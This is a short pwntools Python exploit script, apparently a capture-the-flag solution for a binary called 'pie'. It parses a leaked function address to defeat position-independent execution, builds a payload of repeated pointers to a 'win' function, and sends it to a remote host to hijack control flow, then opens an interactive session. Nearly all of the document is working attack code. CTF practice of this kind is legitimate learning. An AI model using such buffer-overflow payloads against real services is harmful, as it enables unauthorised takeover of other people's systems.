#!/usr/bin/python3

from pwn import *

#for i in range(50 , 100):
p = process('./pie')
p = remote("104.154.232.79", 6503)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#p = remote('sharkyctf.xyz', 20334)
#libc = ELF('/lib64/ld-linux-x86-64.so.2')
#libc = ELF('pie')
binary = ELF('./pie')

print(p.recvuntil('address of vuln is '))
vuln = eval(p.recvline().strip())
print(hex(vuln), binary.symbols['vuln'])
libcbase = vuln - binary.symbols['vuln']
print('libcbase: ' + hex(libcbase))

win = binary.symbols['win']
print(win , libcbase + win )
print(p.recvline())

payload  = 0x50*b'A'
#payload += p64(vuln)
#payload += p64(0x0)
payload = 10*p64(libcbase + win)
print(payload)
#print(p.recvline())
p.sendline(payload)
p.interactive()
#print(p.recvline())
    
